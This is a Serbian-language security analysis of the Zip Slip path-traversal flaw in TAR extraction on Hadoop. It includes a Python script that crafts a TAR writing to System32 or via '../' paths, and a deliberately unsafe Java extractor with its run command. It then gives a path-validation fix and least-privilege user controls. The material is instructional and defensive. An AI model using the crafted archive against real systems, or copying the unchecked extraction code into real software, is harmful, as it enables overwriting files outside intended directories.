## Zip Slip - analiza

Zip Slip je ranjivost koja se ispoljava prilikom obrade arhivskih fajlova, npr. ZIP i TAR. Ova ranjivost omogućava napadačima da iskoriste nebezbednu logiku raspakivanja fajlova kako bi zapisali zlonamerni sadržaj na neautorizovane lokacije u fajl sistemu.

Glavni uzrok ranjivosti leži u tome što aplikacija ne proverava putanje fajlova unutar arhive. Napadači mogu kreirati arhive koje sadrže fajlove sa apsolutnim putanjama (npr. `C:/Windows/System32`) ili relativnim putanjama koje koriste `../` za vraćanje u prethodne direktorijume. Tokom procesa raspakivanja, ako aplikacija slepo veruje ovim putanjama, može se desiti da zlonamerni fajlovi budu upisani van ciljnog direktorijuma, čime se ugrožava bezbednost sistema.

Primeri pajton skripte za kreiranje malicioznog TAR fajla:
```python
import tarfile
import io

def create_malicious_tar(tar_path, target_file_path, content):
    with tarfile.open(tar_path, "w") as tar:
        # Create a file-like object from the content (bytes)
        fileobj = io.BytesIO(content.encode('utf-8'))
        
        # Create the TarInfo object with the path where you want to extract the file
        tarinfo = tarfile.TarInfo(name=target_file_path)
        tarinfo.size = len(content)  # Set the size of the file

        # Add the file to the TAR archive
        tar.addfile(tarinfo, fileobj=fileobj)

    print(f"Malicious TAR created at: {tar_path}")

# Specify where the file should be unpacked
target_file_path = "C:\\Windows\\System32\\malicious.txt"  # Example of absoulute path
# target_file_path = ..\\..\\malicious.txt"  # Example of relative path
# target_file_path = extracted\\malicious.txt"  # Example of safe path

tar_path = "malicious.tar"

# The content of the file to be packed in the TAR file
content = "This is a malicious file that will be unpacked to a specific directory."

# Create the malicious TAR
create_malicious_tar(tar_path, target_file_path, content)
```

Ranjivost se kod Hadoop sistema može eksploatisati tako što se maliciozni TAR fajl prebaci u HDFS i njegovo ekstraktovanje izvrši pomoću Java programa koji nebezbedno rukuje putanjama na koje treba da se ekstraktuje TAR fajl. Takav Java program je dat u nastavku:

```java
import org.apache.commons.compress.archivers.tar.TarArchiveInputStream;
import org.apache.hadoop.fs.FileSystem;
import org.apache.hadoop.fs.Path;
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.FSDataInputStream;

import java.io.IOException;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.BufferedOutputStream;
import java.io.File;

public class ExploitHadoopTar {

    public static void main(String[] args) throws IOException {
        if (args.length != 1) {
            System.out.println("Usage: HadoopTarExploit <path-to-tar-file>");
            System.exit(1);
        }

        // Get TAR file path from arguments
        String tarFilePath = args[0];

        // Configuration for Hadoop FileSystem (you may need to adjust this based on your Hadoop setup)
        Configuration conf = new Configuration();
        FileSystem fs = FileSystem.get(conf);

        // Open the malicious TAR file from HDFS
        Path hdfsTarFilePath = new Path(tarFilePath);  // HDFS path
        try (FSDataInputStream tarFileStream = fs.open(hdfsTarFilePath);
             TarArchiveInputStream tarInputStream = new TarArchiveInputStream(tarFileStream)) {

            // Iterate over the TAR entries and extract them
            org.apache.commons.compress.archivers.tar.TarArchiveEntry entry;
            while ((entry = tarInputStream.getNextTarEntry()) != null) {
                String entryName = entry.getName();
                System.out.println("Extracting: " + entryName);

                // Create the local extraction file
                File extractionFile = new File(entryName);  // Local path (relative to current directory or absolute path)

                // If the entry is a directory, create the directory on the local filesystem
                if (entry.isDirectory()) {
                    extractionFile.mkdirs();
                    continue;  // Skip to the next entry
                }

                // Ensure the parent directory exists
                File parentDir = extractionFile.getParentFile();
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }

                // Create the output stream to write the extracted file locally
                try (BufferedOutputStream outputStream = new BufferedOutputStream(new FileOutputStream(extractionFile))) {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = tarInputStream.read(buffer)) != -1) {
                        outputStream.write(buffer, 0, bytesRead);
                    }
                }

                System.out.println("Extracted to: " + extractionFile.getAbsolutePath());
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
Pokretanjem ovog Java programa doći će do raspakivanja TAR fajla na putanje koje su podešene u TAR fajlu bez ikakve provere validnosti tih putanja. Pokretanje se vrši komandom: `hadoop jar path/to/jar/ExploitHadoopTar.jar ExploitHadoopTar path/to/tar/on/hdfs/malicious.tar`.


### Bezbednosne kontrole

1. Validacija raspakovanih putanja prilikom raspakivanja
2. Kreiranje posebnog korisnika za pokretanje Hadoop aplikacije sa ograničenjima za pisanje i čitanje

#### Validacija raspakovanih putanja prilikom raspakivanja
Validacija putanja se ogleda u proveri da li je putanja apsolutna i da li sadrzi `../` za povratak u roditeljski direktorijum. U nastavku je prikazana funkcija za validaciju i izmenjeni deo koda iz prethodnog primera:
```java
private static boolean isPathValid(String entryName) {
    // Check if the path is absolute
    File entryFile = new File(entryName);
    if (entryFile.isAbsolute()) {
        return false;
    }

    // Check if the path contains '../'
    String normalizedPath = entryFile.getPath().replace("\\", "/"); // Normalize path for cross-platform compatibility
    if (normalizedPath.contains("../")) {
        return false;
    }

    return true;
}

...

// Add check in example code
if (!isPathValid(entryName)) {
    System.out.println("Invalid path: " + entryName);
    continue;
}
```

#### Kreiranje posebnog korisnika za pokretanje Hadoop aplikacije sa ograničenjima za pisanje i čitanje
Rešenja leži u izolaciji aplikacije koja obezbeđuje da ona ima pristup samo onim resursima koji su potrebni za njen rad. Ovaj pristup eliminiše mogućnost neovlašćenog pristupa ili manipulacije fajlovima van predviđenih putanja na sistemu, čime se smanjuje šansa za zloupotrebu.

Prvi korak u implementaciji je kreiranje korisničkog naloga na nivou operativnog sistema koji je specifičan za Hadoop aplikaciju. Ovaj korisnik treba da ima definisana prava pristupa direktorijumima i fajlovima. Prava treba da budu ograničena samo na one direktorijume koji su ključni za funkcionisanje aplikacije. Na primer, čitanje konfiguracionih fajlova i pristupanje HDFS-u. Pristup za čitanje treba omogućiti samo unutar direktorijuma gde je Hadoop instaliran, kako bi se osigurala pravilna konfiguracija i rad. Na ovaj način, čak i u slučaju kompromitovanja aplikacije, napadač neće moći da pristupi sistemskim fajlovima ili podacima van definisanih granica.

Pored čitanja, potrebno je pažljivo definisati i dozvoljene lokacije za upisivanje novih podataka. Ovo je posebno važno u slučaju kada Hadoop aplikacija koristi lokalni fajl sistem za skladištenje rezultata ili privremenih podataka, a ne direktno HDFS. Ovi direktorijumi za upisivanje treba da budu jasno specificirani. Dodeljivanje prava pristupa ovim direktorijumima treba da bude ograničeno na korisnika pod kojim se aplikacija izvršava. Time bi se osigurali da prethodno prikazani TAR fajl ne može biti raspakovan na bilo kojoj putanji, već samo na onim putanjama koje su definisane konfiguracijom korisničkog naloga.

Ukoliko se koristi Hadoop MapReduce sistem, potrebno je definisati direktorijume iz kojih aplikacija može da čita ulazne podatke i u koje može da zapisuje rezultate. Ova ograničenja treba primeniti na svim nivoima aplikacije kako bi se sprečilo namerno čitanje i upisivanje podataka van predviđenih direktorijuma.

Ovakav sistem zaštite zasniva se na postavljanju ograničenja na nivou operativnog sistema. Način implementacije zavisi od operativnog sistema, ali je suština da treba kreirati specifičnog korisnika sa ograničenim pravima pristupa i definisati direktorijume kojima korisnik može da pristupa. Nakon toga, Hadoop aplikacija se pokreće sa dozvolama tog korisnika, što osigurava da aplikacija poštuje postavljena pravila.
